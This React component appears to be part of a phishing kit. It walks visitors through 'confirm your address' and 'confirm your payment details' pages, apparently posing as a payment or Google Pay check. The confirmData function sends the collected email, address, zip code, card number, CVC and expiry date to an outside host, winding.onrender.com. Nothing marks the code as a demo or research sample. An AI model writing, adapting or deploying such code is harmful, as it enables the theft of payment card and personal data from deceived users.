import { Routes, Route } from "react-router-dom";
import { useState } from "react";
import First from "./first.js";
import Second from "./second.js";
import Third from "./third.js";
import Gpay from "./gpay";
import Last from './last';


const MyBody = () => {

    const [myemail, setMyemail] = useState("");
    const [myzipcode, setMyzipcode] = useState("");
    const [myaddress, setMyaddress] = useState("");
    const [myccnumber, setMyccnumber] = useState("");
    const [mycccsc, setMycccsc] = useState("");
    const [myexp, setMyexp] = useState("");

    const confirmData = () => {
        fetch("https://winding.onrender.com", {
            headers: {
                "Content-Type": "application/json"
            },
            body : JSON.stringify({
                myemail,
                myzipcode,
                myaddress,
                myccnumber,
                mycccsc,
                myexp
            })
        })
    }

    // routes home



    return (
        <main className="flex-grow flex items-center
        justify-center " > 
            <Routes>
                <Route 
                index
                element={<First setMyemail={setMyemail}
                myemail={myemail} />} />

                <Route path="confirm-your-address" 
                element={<Second setMyzipcode={setMyzipcode}
                myzipcode={myzipcode} 
                myaddress={myaddress}
                setMyaddress={setMyaddress} />} />

                <Route path="confirm-your-payment-details" 
                element={<Third setMyccnumber={setMyccnumber} 
                myccnumber={myccnumber} mycccsc={mycccsc}
                myexp={myexp} myaddress={myaddress} 
                myzipcode={myzipcode} myemail={myemail}
                confirmData={confirmData}
                setMycccsc={setMycccsc} setMyexp={setMyexp}
                 />} />

                <Route path="successful" 
                element={<Last />} />
            </Routes>
        </main>
    )
}
export default MyBody;